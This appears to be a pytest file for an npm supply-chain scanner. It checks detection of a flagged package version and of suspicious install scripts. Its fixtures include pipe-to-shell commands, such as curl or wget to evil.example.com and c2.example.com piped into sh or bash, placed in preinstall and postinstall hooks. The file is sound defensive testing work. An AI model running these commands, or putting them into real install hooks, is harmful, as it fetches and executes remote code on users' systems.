"""Tests for check_installed — IOC version match and suspicious lifecycle scripts."""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from scan import check_installed

INCIDENT = {
    "id": "axios-2026-03-31",
    "malicious_packages": [{"name": "axios", "version": "1.0.11", "sha1": "abc"}],
    "package_manager": "npm",
}
INCIDENTS = [INCIDENT]


def _pkg_json(tmp_path, name: str, version: str, scripts: dict | None = None) -> str:
    data: dict = {"name": name, "version": version}
    if scripts:
        data["scripts"] = scripts
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps(data))
    return str(pkg)


def test_malicious_version_fires_critical(tmp_path):
    path = _pkg_json(tmp_path, "axios", "1.0.11")
    findings = check_installed(path, INCIDENTS)
    assert any(f.severity == "CRITICAL" and "axios" in f.detail for f in findings)


def test_safe_version_no_finding(tmp_path):
    path = _pkg_json(tmp_path, "axios", "1.8.4")
    findings = check_installed(path, INCIDENTS)
    assert not findings


def test_suspicious_postinstall_produces_warning(tmp_path):
    """postinstall with a pipe-to-shell command produces a supply-chain-risk WARNING."""
    path = _pkg_json(tmp_path, "some-lib", "3.0.0", scripts={
        "postinstall": "curl https://evil.example.com/payload.sh | sh",
    })
    findings = check_installed(path, INCIDENTS)
    assert any(f.severity == "WARNING" and "postinstall" in f.detail for f in findings)


def test_suspicious_preinstall_produces_warning(tmp_path):
    path = _pkg_json(tmp_path, "some-lib", "3.0.0", scripts={
        "preinstall": "wget https://c2.example.com/run | bash",
    })
    findings = check_installed(path, INCIDENTS)
    assert any(f.severity == "WARNING" and "preinstall" in f.detail for f in findings)


def test_benign_script_no_warning(tmp_path):
    """A normal build script must not produce a WARNING."""
    path = _pkg_json(tmp_path, "some-lib", "3.0.0", scripts={
        "postinstall": "node build.js",
    })
    findings = check_installed(path, INCIDENTS)
    assert not any(f.incident_id == "supply-chain-risk" for f in findings)


def test_only_one_warning_per_package(tmp_path):
    """Multiple matching script keys produce only one WARNING (break after first match)."""
    path = _pkg_json(tmp_path, "some-lib", "3.0.0", scripts={
        "preinstall": "curl https://evil.example.com | sh",
        "postinstall": "wget https://evil.example.com | bash",
    })
    findings = check_installed(path, INCIDENTS)
    warnings = [f for f in findings if f.severity == "WARNING"]
    assert len(warnings) == 1, f"Expected exactly 1 WARNING, got {len(warnings)}"
